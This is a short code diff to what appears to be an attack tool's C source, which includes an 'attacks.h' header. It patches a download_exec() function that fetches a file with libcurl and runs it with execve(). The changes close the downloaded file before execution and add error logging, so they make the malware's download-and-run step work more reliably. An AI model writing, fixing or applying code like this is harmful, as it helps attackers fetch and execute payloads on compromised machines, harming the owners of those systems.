@@ -7,6 +7,7 @@
 #include <curl/curl.h>
 #include <sys/wait.h>
 #include <fcntl.h>
+#include <errno.h>
 
 #include "../include/attacks.h"
 #include "../include/utils.h"
@@ -133,7 +134,7 @@ static int execute(char *file_path) {
             LOG("Attempting to exec %s\n", file_path);
             char *argv[] = {file_path, NULL};
             execve(file_path, argv, NULL);
-            LOG("execve failed in execute()\n");
+            LOG("execve failed in execute(): %s\n", strerror(errno));
             exit(EXIT_FAILURE);
         default:
             break;
@@ -247,11 +248,13 @@ void download_exec(void) {
         return;
     }
 
+    fclose(fp); // close file before executing
+
     if(execute(file_path) != 0) {
         LOG("failed to perform execution in download_exec()\n");
     }
 
-    fclose(fp);
+    
     curl_easy_cleanup(curl);
     curl_global_cleanup(); // fix this, we shouldnt be calling every time
 #endif
